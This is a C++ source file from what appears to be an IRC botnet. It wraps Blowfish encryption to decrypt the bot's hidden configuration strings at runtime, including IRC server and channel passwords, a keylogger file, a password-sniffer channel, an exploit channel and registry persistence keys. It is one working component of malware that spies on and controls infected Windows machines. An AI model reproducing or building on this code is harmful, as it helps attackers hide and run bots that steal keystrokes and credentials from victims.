#include "includes.h"
#include "functions.h"
#include "externs.h"
#include "blow/fish.h"	// holds the random digit tables

#ifndef NO_CRYPT 

void BlowCrypt( char key[], char * data){
	if (!((key==NULL||data==NULL) ||(*key==NULL || *data==NULL))){
    char *p = encrypt_string(key,data);
	//wsprintf(data,"+OK %s",p);
	wsprintf(data,"%s",p);
	delete p;
	}
}
void BlowDeCrypt( char key[], char * data){
	if (!((key==NULL||data==NULL)||(*key==NULL || *data==NULL))){
	char *p = decrypt_string(key,data);
	wsprintf(data,"%s",p);
	delete p;
	}
}

void PBlowCrypt(char key[], char * data){
	if (!((key==NULL||data==NULL) ||(*key==NULL || *data==NULL))){
	char *p = encrypt_string(key,data);
	wsprintf(data,"+OK %s",p);
	delete p;
	}
}

void stripOK(char str[512],char *str2){
	int i;
	for (i=0;i<strlen(str);i++)
	{
		if (i>3) {str2[i-4]=str[i];} 
	} 
	str2[i-4]='\0';
}


void decryptstrings(int authsize, int versionsize)
{
	BlowDeCrypt(botid,version);
	BlowDeCrypt(botid,server);
	BlowDeCrypt(botid,serverpass);
	BlowDeCrypt(botid,channel);
	BlowDeCrypt(botid,chanpass);
	BlowDeCrypt(botid,server2);
	BlowDeCrypt(botid,channel2);
	BlowDeCrypt(botid,chanpass2);
	BlowDeCrypt(botid,filename);
	BlowDeCrypt(botid,keylogfile);
	BlowDeCrypt(botid,valuename);
	BlowDeCrypt(botid,nickconst);
	BlowDeCrypt(botid,modeonconn);
	BlowDeCrypt(botid,exploitchan);
//	BlowDeCrypt(botid,keylogchan);
	BlowDeCrypt(botid,psniffchan);
	BlowDeCrypt(botid,regkey1);
	BlowDeCrypt(botid,regkey2);
	BlowDeCrypt(botid,regkey3);
	BlowDeCrypt(botid,regkey4);
	BlowDeCrypt(botid,password);
	//BlowDeCrypt(botid,authost[1]);
	return;
};

#endif
